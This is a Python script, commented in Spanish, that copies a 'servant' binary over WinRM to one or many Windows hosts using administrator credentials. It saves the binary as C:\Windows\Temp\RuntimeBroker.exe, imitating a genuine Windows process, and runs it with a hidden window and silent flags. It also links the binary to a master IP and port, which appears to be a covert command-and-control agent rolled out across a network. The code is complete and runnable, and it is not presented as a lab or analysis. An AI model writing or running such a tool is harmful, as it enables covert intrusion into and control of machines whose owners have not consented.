"""
Script de despliegue remoto para Windows usando WMI/WinRM.

Requiere:
    pip install pywinrm

Uso:
    python deploy_windows_remote.py --host 192.168.1.50 --user Administrator --password Pass123

O para múltiples hosts:
    python deploy_windows_remote.py --hosts hosts.txt --user Administrator --password Pass123
"""

import argparse
import sys
import os
from pathlib import Path

try:
    import winrm
except ImportError:
    print("Error: pywinrm no instalado. Ejecuta: pip install pywinrm")
    sys.exit(1)


def deploy_to_host(host, username, password, binary_path, token, master_ip, master_port):
    """Despliega el servant en un host Windows remoto."""
    
    print(f"\n[*] Desplegando en {host}...")
    
    # Conectar via WinRM
    try:
        session = winrm.Session(f'http://{host}:5985/wsman', auth=(username, password))
    except Exception as e:
        print(f"[-] Error conectando a {host}: {e}")
        return False
    
    # Leer binario
    if not os.path.exists(binary_path):
        print(f"[-] Binario no encontrado: {binary_path}")
        return False
    
    with open(binary_path, 'rb') as f:
        binary_data = f.read()
    
    # Ruta remota
    remote_path = r"C:\Windows\Temp\RuntimeBroker.exe"
    
    # PowerShell script para copiar y ejecutar
    ps_script = f"""
    # Escribir binario (en base64 para transferencia segura)
    $bytes = [System.Convert]::FromBase64String('{binary_data.hex()}')
    [System.IO.File]::WriteAllBytes('{remote_path}', $bytes)
    
    # Ejecutar en segundo plano
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = '{remote_path}'
    $startInfo.Arguments = '--hide-window --silent --token {token} --logfile C:\\Windows\\Temp\\.srv.log --pidfile C:\\Windows\\Temp\\.srv.pid --master-host {master_ip} --master-port {master_port}'
    $startInfo.WindowStyle = 'Hidden'
    $startInfo.CreateNoWindow = $true
    
    $process = [System.Diagnostics.Process]::Start($startInfo)
    
    Write-Host "Servant desplegado. PID: $($process.Id)"
    """
    
    # Nota: El script anterior usa .hex() pero debería ser base64
    # Corrijo aquí:
    import base64
    binary_b64 = base64.b64encode(binary_data).decode()
    
    ps_script = f"""
    # Escribir binario
    $bytes = [System.Convert]::FromBase64String('{binary_b64}')
    [System.IO.File]::WriteAllBytes('{remote_path}', $bytes)
    
    # Ejecutar en segundo plano
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = '{remote_path}'
    $startInfo.Arguments = '--hide-window --silent --token {token} --logfile C:\\Windows\\Temp\\.srv.log --pidfile C:\\Windows\\Temp\\.srv.pid --master-host {master_ip} --master-port {master_port}'
    $startInfo.WindowStyle = 'Hidden'
    $startInfo.CreateNoWindow = $true
    
    $process = [System.Diagnostics.Process]::Start($startInfo)
    
    Write-Host "Servant desplegado. PID: $($process.Id)"
    """
    
    try:
        result = session.run_ps(ps_script)
        if result.status_code == 0:
            print(f"[+] Desplegado exitosamente en {host}")
            print(f"    Output: {result.std_out.decode().strip()}")
            return True
        else:
            print(f"[-] Error en {host}: {result.std_err.decode()}")
            return False
    except Exception as e:
        print(f"[-] Error ejecutando en {host}: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="Despliega servant en hosts Windows remotos")
    parser.add_argument('--host', help='Host individual')
    parser.add_argument('--hosts', help='Archivo con lista de hosts (uno por línea)')
    parser.add_argument('--user', required=True, help='Usuario Windows')
    parser.add_argument('--password', required=True, help='Contraseña')
    parser.add_argument('--binary', default='dist/RuntimeBroker.exe', help='Ruta al binario')
    parser.add_argument('--token', default='changeme-token', help='Token de autenticación')
    parser.add_argument('--master-ip', required=True, help='IP del master')
    parser.add_argument('--master-port', default=65433, type=int, help='Puerto del master')
    
    args = parser.parse_args()
    
    hosts = []
    if args.host:
        hosts.append(args.host)
    elif args.hosts:
        with open(args.hosts, 'r') as f:
            hosts = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    else:
        print("Error: Debes especificar --host o --hosts")
        sys.exit(1)
    
    print(f"=== Desplegando servant en {len(hosts)} host(s) ===")
    
    success = 0
    for host in hosts:
        if deploy_to_host(host, args.user, args.password, args.binary, args.token, args.master_ip, args.master_port):
            success += 1
    
    print(f"\n=== Resumen: {success}/{len(hosts)} desplegados exitosamente ===")


if __name__ == '__main__':
    main()
